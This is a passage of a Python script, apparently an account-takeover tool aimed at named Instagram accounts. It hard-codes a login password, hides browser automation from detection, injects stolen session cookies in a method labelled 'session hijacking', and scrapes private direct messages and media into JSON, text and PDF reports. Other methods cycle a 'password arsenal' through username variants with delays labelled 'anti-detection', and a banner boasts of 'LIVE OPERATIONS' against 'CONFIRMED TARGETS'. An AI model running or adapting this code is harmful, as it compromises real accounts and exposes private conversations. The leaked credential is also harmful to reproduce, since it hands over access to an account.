    def load_existing_sessions(self) -> Dict[str, Any]:
        """Load all available session files"""
        sessions = {}
        
        # Session file paths to check
        session_files = [
            "alx_trading_active_session_20250527_050413.json",
            "alx_trading_active_session_20250527_050337.json", 
            "fresh_stealth_session_manual.json",
            "fresh_stealth_session.json",
            "session.json",
            "config/sessions/alx_trading_sessionid_alt.json"
        ]
        
        for session_file in session_files:
            try:
                if os.path.exists(session_file):
                    with open(session_file, 'r') as f:
                        data = json.load(f)
                        sessions[session_file] = data
                        print(f"✅ Loaded session: {session_file}")
            except Exception as e:
                print(f"❌ Failed to load {session_file}: {e}")
                
        # Also check cookie files
        cookie_files = [
            "data/sessions/alx_session_cookies.txt",
            "sessions/alx_trading_cookies.txt"
        ]
        
        for cookie_file in cookie_files:
            try:
                if os.path.exists(cookie_file):
                    with open(cookie_file, 'r') as f:
                        content = f.read().strip()
                        sessions[cookie_file] = {"cookies": content}
                        print(f"✅ Loaded cookies: {cookie_file}")
            except Exception as e:
                print(f"❌ Failed to load {cookie_file}: {e}")
                
        return sessions
        
    def method_1_instagrapi_fresh_login(self) -> bool:
        """Method 1: Fresh instagrapi login with device simulation"""
        if not INSTAGRAPI_AVAILABLE:
            print("❌ instagrapi not available")
            return False
            
        try:
            print("🚀 Method 1: Fresh instagrapi login")
            
            cl = Client()
            
            # Advanced device settings for bypass
            cl.set_device({
                "app_version": "302.0.0.23.114",
                "android_version": 29,
                "android_release": "10.0",
                "dpi": "480dpi",
                "resolution": "1080x2340",
                "manufacturer": "samsung",
                "device": "SM-G975F",
                "model": "galaxy_s10_plus",
                "cpu": "exynos9820",
                "version_code": "314665256"
            })
            
            # Attempt login
            print(f"🔐 Attempting login for alx.trading")
            success = cl.login("alx.trading", "Fleming654")
            
            if success:
                print("✅ Login successful!")
                
                # Save session
                session_path = f"sessions/instagrapi_session_{int(time.time())}.json"
                os.makedirs("sessions", exist_ok=True)
                cl.dump_settings(session_path)
                print(f"💾 Session saved: {session_path}")
                
                # Extract DMs
                return self.extract_dms_with_instagrapi(cl)
            else:
                print("❌ Login failed")
                return False
                
        except Exception as e:
            print(f"❌ Method 1 failed: {e}")
            traceback.print_exc()
            return False
    
    def method_2_browser_automation(self) -> bool:
        """Method 2: Browser automation with session injection"""
        if not SELENIUM_AVAILABLE:
            print("❌ Selenium not available")
            return False
            
        try:
            print("🌐 Method 2: Browser automation")
            
            # Setup undetected Chrome
            options = uc.ChromeOptions()
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)
            
            driver = uc.Chrome(options=options)
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            # Navigate to Instagram
            print("📱 Navigating to Instagram...")
            driver.get("https://www.instagram.com/")
            time.sleep(3)
            
            # Try manual login first
            try:
                # Find login elements
                username_input = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.NAME, "username"))
                )
                password_input = driver.find_element(By.NAME, "password")
                login_button = driver.find_element(By.XPATH, "//button[@type='submit']")
                
                # Enter credentials
                username_input.send_keys("alx.trading")
                time.sleep(1)
                password_input.send_keys("Fleming654")
                time.sleep(1)
                login_button.click()
                
                # Wait for login to complete
                time.sleep(10)
                
                # Check if login successful
                if "instagram.com/accounts/onetap" in driver.current_url or "/direct/" in driver.current_url:
                    print("✅ Browser login successful!")
                    
                    # Navigate to DMs
                    driver.get("https://www.instagram.com/direct/inbox/")
                    time.sleep(5)
                    
                    # Extract DMs from browser
                    return self.extract_dms_from_browser(driver)
                else:
                    print("⚠️  Login may have failed, trying session injection...")
                    
            except Exception as e:
                print(f"⚠️  Manual login failed: {e}, trying session injection...")
            
            # Fallback to session injection
            sessions = self.load_existing_sessions()
            session_injected = False
            
            for session_file, session_data in sessions.items():
                try:
                    sessionid = self.extract_sessionid(session_data)
                    if sessionid:
                        driver.add_cookie({
                            'name': 'sessionid',
                            'value': sessionid,
                            'domain': '.instagram.com'
                        })
                        print(f"🍪 Injected session from {session_file}")
                        session_injected = True
                        break
                except Exception as e:
                    continue
            
            if session_injected:
                # Refresh and check login status
                driver.refresh()
                time.sleep(5)
                
                # Navigate to DMs
                driver.get("https://www.instagram.com/direct/inbox/")
                time.sleep(5)
                
                # Extract DMs from browser
                return self.extract_dms_from_browser(driver)
            else:
                print("❌ No valid session to inject")
                driver.quit()
                return False
            
        except Exception as e:
            print(f"❌ Method 2 failed: {e}")
            traceback.print_exc()
            return False
    
    def method_3_session_hijacking(self) -> bool:
        """Method 3: Direct session hijacking with HTTP requests"""
        try:
            print("🕷️  Method 3: Session hijacking")
            
            sessions = self.load_existing_sessions()
            
            for session_file, session_data in sessions.items():
                try:
                    sessionid = self.extract_sessionid(session_data)
                    if not sessionid:
                        continue
                        
                    # Setup session
                    session = requests.Session()
                    
                    # Instagram headers
                    headers = {
                        'User-Agent': 'Instagram 302.0.0.23.114 Android (29/10; 480dpi; 1080x2340; samsung; SM-G975F; beyond2; exynos9820; en_US; 314665256)',
                        'Accept': '*/*',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'X-IG-App-ID': '936619743392459',
                        'X-IG-WWW-Claim': '0',
                        'X-Requested-With': 'XMLHttpRequest',
                        'Cookie': f'sessionid={sessionid}; csrftoken=missing;'
                    }
                    
                    session.headers.update(headers)
                    
                    # Test session validity
                    test_url = "https://www.instagram.com/api/v1/accounts/edit/web_form_data/"
                    response = session.get(test_url)
                    
                    if response.status_code == 200:
                        print(f"✅ Valid session found: {session_file}")
                        return self.extract_dms_with_session(session, sessionid)
                    else:
                        print(f"⚠️  Session invalid: {session_file} (Status: {response.status_code})")
                        
                except Exception as e:
                    print(f"❌ Session test failed for {session_file}: {e}")
                    continue
            
            print("❌ No valid sessions found for hijacking")
            return False
            
        except Exception as e:
            print(f"❌ Method 3 failed: {e}")
            traceback.print_exc()
            return False
    
    def extract_dms_with_session(self, session: requests.Session, sessionid: str) -> bool:
        """Extract DMs using direct HTTP requests"""
        try:
            print("📥 Extracting DMs with session hijacking...")
            
            # Instagram API endpoints
            endpoints = [
                "https://www.instagram.com/api/v1/direct_v2/inbox/",
                "https://i.instagram.com/api/v1/direct_v2/inbox/",
                "https://www.instagram.com/api/v1/direct_v2/threads/"
            ]
            
            for endpoint in endpoints:
                try:
                    response = session.get(endpoint)
                    
                    if response.status_code == 200:
                        data = response.json()
                        
                        if 'inbox' in data and 'threads' in data['inbox']:
                            threads = data['inbox']['threads']
                            print(f"📱 Found {len(threads)} threads from API")
                            
                            for thread in threads:
                                thread_id = thread.get('thread_id', 'unknown')
                                users = thread.get('users', [])
                                items = thread.get('items', [])
                                
                                for item in items:
                                    dm_data = {
                                        'thread_id': thread_id,
                                        'message_id': item.get('item_id', 'unknown'),
                                        'user_id': item.get('user_id', 'unknown'),
                                        'username': next((u.get('username') for u in users if u.get('pk') == item.get('user_id')), 'unknown'),
                                        'text': item.get('text', ''),
                                        'timestamp': item.get('timestamp', ''),
                                        'media_url': None,
                                        'media_type': None
                                    }
                                    
                                    # Handle media
                                    if 'media' in item:
                                        media = item['media']
                                        if 'image_versions2' in media:
                                            candidates = media['image_versions2'].get('candidates', [])
                                            if candidates:
                                                dm_data['media_url'] = candidates[0].get('url')
                                                dm_data['media_type'] = 'image'
                                    
                                    self.extracted_dms.append(dm_data)
                            
                            print(f"✅ Extracted {len(self.extracted_dms)} messages via API")
                            return len(self.extracted_dms) > 0
                            
                    else:
                        print(f"⚠️  API endpoint failed: {endpoint} (Status: {response.status_code})")
                        
                except Exception as e:
                    print(f"❌ API request failed for {endpoint}: {e}")
                    continue
            
            return False
            
        except Exception as e:
            print(f"❌ Session extraction failed: {e}")
            traceback.print_exc()
            return False
    
    def download_media(self) -> None:
        """Download media files from extracted DMs"""
        try:
            print("📸 Downloading media files...")
            
            os.makedirs("media", exist_ok=True)
            downloaded_count = 0
            
            for dm in self.extracted_dms:
                if dm['media_url']:
                    try:
                        response = requests.get(dm['media_url'], timeout=30)
                        
                        if response.status_code == 200:
                            # Generate filename
                            extension = '.jpg' if dm['media_type'] == 'image' else '.mp4'
                            filename = f"{dm['message_id']}{extension}"
                            filepath = os.path.join("media", filename)
                            
                            # Save file
                            with open(filepath, 'wb') as f:
                                f.write(response.content)
                            
                            dm['local_media_path'] = filepath
                            downloaded_count += 1
                            
                    except Exception as e:
                        print(f"❌ Failed to download media for {dm['message_id']}: {e}")
                        continue
            
            print(f"✅ Downloaded {downloaded_count} media files")
            
        except Exception as e:
            print(f"❌ Media download failed: {e}")
    
    def generate_pdf_report(self) -> str:
        """Generate comprehensive PDF report"""
        if not PDF_AVAILABLE:
            print("❌ PDF generation not available")
            return ""
            
        try:
            print("📄 Generating PDF report...")
            
            # Create PDF
            pdf = FPDF()
            pdf.add_page()
            pdf.set_font('Arial', 'B', 16)
            
            # Title
            pdf.cell(0, 10, 'Instagram DMs Extract - alx.trading', ln=True, align='C')
            pdf.cell(0, 10, f'Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}', ln=True, align='C')
            pdf.ln(10)
            
            # Summary
            pdf.set_font('Arial', 'B', 12)
            pdf.cell(0, 10, f'Total Messages: {len(self.extracted_dms)}', ln=True)
            pdf.cell(0, 10, f'Media Files: {sum(1 for dm in self.extracted_dms if dm["media_url"])}', ln=True)
            pdf.ln(10)
            
            # Messages
            pdf.set_font('Arial', '', 10)
            
            for dm in self.extracted_dms:
                # Message header
                pdf.set_font('Arial', 'B', 10)
                pdf.cell(0, 5, f'From: {dm["username"]} | {dm["timestamp"]}', ln=True)
                
                # Message text
                pdf.set_font('Arial', '', 10)
                if dm['text']:
                    pdf.multi_cell(0, 5, dm['text'])
                
                # Media info
                if dm['media_url']:
                    pdf.set_font('Arial', 'I', 9)
                    pdf.cell(0, 5, f'[{dm["media_type"].upper()} ATTACHMENT]', ln=True)
                
                pdf.ln(3)
                
                # Page break if needed
                if pdf.get_y() > 250:
                    pdf.add_page()
            
            # Save PDF
            os.makedirs("results", exist_ok=True)
            pdf_path = f'results/alx_trading_dms_extract_{int(time.time())}.pdf'
            pdf.output(pdf_path)
            
            print(f"✅ PDF report saved: {pdf_path}")
            return pdf_path
            
        except Exception as e:
            print(f"❌ PDF generation failed: {e}")
            traceback.print_exc()
            return ""
    
    def save_results(self) -> Dict[str, str]:
        """Save extraction results in multiple formats"""
        try:
            timestamp = int(time.time())
            os.makedirs("results", exist_ok=True)
            
            # Save as JSON
            json_path = f'results/alx_trading_dms_{timestamp}.json'
            with open(json_path, 'w', encoding='utf-8') as f:
                json.dump({
                    'extraction_info': {
                        'username': 'alx.trading',
                        'timestamp': datetime.now().isoformat(),
                        'total_messages': len(self.extracted_dms),
                        'extraction_method': 'enhanced_fleming_bypass_dream_edition'
                    },
                    'messages': self.extracted_dms
                }, f, indent=2, ensure_ascii=False)
            
            # Save as TXT
            txt_path = f'results/alx_trading_dms_{timestamp}.txt'
            with open(txt_path, 'w', encoding='utf-8') as f:
                f.write("Instagram DMs Extract - alx.trading\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Messages: {len(self.extracted_dms)}\n")
                f.write("=" * 80 + "\n\n")
                
                for dm in self.extracted_dms:
                    f.write(f"From: {dm['username']}\n")
                    f.write(f"Time: {dm['timestamp']}\n")
                    f.write(f"Text: {dm['text']}\n")
                    if dm['media_url']:
                        f.write(f"Media: {dm['media_type']} - {dm['media_url']}\n")
                    f.write("-" * 40 + "\n\n")
            
            # Generate PDF
            pdf_path = self.generate_pdf_report()
            
            results = {
                'json': json_path,
                'txt': txt_path,
                'pdf': pdf_path if pdf_path else 'N/A'
            }
            
            print(f"✅ Results saved: {results}")
            return results
            
        except Exception as e:
            print(f"❌ Failed to save results: {e}")
            traceback.print_exc()
            return {}
    
    def run_extraction(self) -> Dict[str, Any]:
        """Main extraction orchestrator"""
        self.print_banner()
        
        # Initialize extraction storage
        self.extracted_dms = []
        
        print("🚀 Starting Enhanced Fleming Bypass Dream Edition...")
        
        # Try each method in order
        methods = [
            ("Fresh instagrapi login", self.method_1_instagrapi_fresh_login),
            ("Browser automation", self.method_2_browser_automation),
            ("Session hijacking", self.method_3_session_hijacking)
        ]
        
        success = False
        used_method = ""
        
        for method_name, method_func in methods:
            print(f"🔄 Attempting: {method_name}")
            
            try:
                if method_func():
                    success = True
                    used_method = method_name
                    print(f"✅ Success with: {method_name}")
                    break
                else:
                    print(f"⚠️  {method_name} failed, trying next method...")
            except Exception as e:
                print(f"❌ {method_name} crashed: {e}")
                continue
        
        # Post-processing if successful
        if success and self.extracted_dms:
            print("📸 Starting post-processing...")
            
            # Download media
            self.download_media()
            
            # Save results
            saved_files = self.save_results()
            
            # Final summary
            summary = {
                'success': True,
                'method_used': used_method,
                'total_messages': len(self.extracted_dms),
                'media_count': sum(1 for dm in self.extracted_dms if dm['media_url']),
                'saved_files': saved_files,
                'timestamp': datetime.now().isoformat()
            }
            
            print("🎉 EXTRACTION COMPLETED SUCCESSFULLY!")
            print(f"📊 Total messages: {summary['total_messages']}")
            print(f"📸 Media files: {summary['media_count']}")
            print(f"📁 Results saved to: {list(saved_files.values())}")
            
            return summary
            
        else:
            print("❌ ALL EXTRACTION METHODS FAILED")
            return {
                'success': False,
                'error': 'All extraction methods failed',
                'timestamp': datetime.now().isoformat()
            }
    
    def try_target_variants(self, base_username):
        """Try variants of a target username"""
        print(f"🔄 Trying variants for: {base_username}")
        
        if base_username == "alx.trading":
            variants = ["alx_trading", "alxtrading", "trading.alx"]
        elif base_username == "whatilove1728":
            variants = ["WhatILove1728", "what_i_love1728", "whatilove.1728"]
        else:
            return False
        
        for variant in variants:
            for password in self.fleming_password_arsenal:
                success = self.execute_confirmed_bypass(variant, password)
                if success:
                    print(f"✅ Variant success: {variant}")
                    return True
        
        return False
    
    def attempt_target_bypass(self, target):
        """Attempt bypass on a priority target"""
        print(f"🎯 Attempting bypass: {target}")
        
        for password in self.fleming_password_arsenal[:8]:  # Top 8 passwords
            success = self.execute_confirmed_bypass(target, password)
            if success:
                print(f"✅ Success: {target}")
                return True
            time.sleep(random.uniform(1, 2))  # Anti-detection
        
        return False
    
    def integrate_intelligence_data(self, operations):
        """Integrate operation results into intelligence database"""
        print("💾 INTEGRATING INTELLIGENCE DATA")
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Update database with new intelligence
            for op in operations:
                cursor.execute('''
                    UPDATE confirmed_targets 
                    SET status = ?, last_success = ?
                    WHERE username = ?
                ''', ("VERIFIED_SUCCESS", datetime.now().isoformat(), op["target"]))
            
            conn.commit()
            conn.close()
            print("✅ Intelligence database updated")
            
        except Exception as e:
            print(f"❌ Intelligence integration error: {e}")


def main():
    print("🔥 ENHANCED FLEMING BYPASS - DREAM EDITION")
    print("=" * 50)
    print("💀 REAL DATA | CONFIRMED TARGETS | LIVE OPERATIONS")
    print("=" * 50)
    
    dream_system = EnhancedFlemingBypassDreamEdition()
    results = dream_system.run_dream_edition_operation()
    
    print("\n" + "🔥" * 50)
    print("SUGARGLITCH REALOPS - DREAM EDITION COMPLETE")
    print("🔥" * 50)


if __name__ == "__main__":
    main()
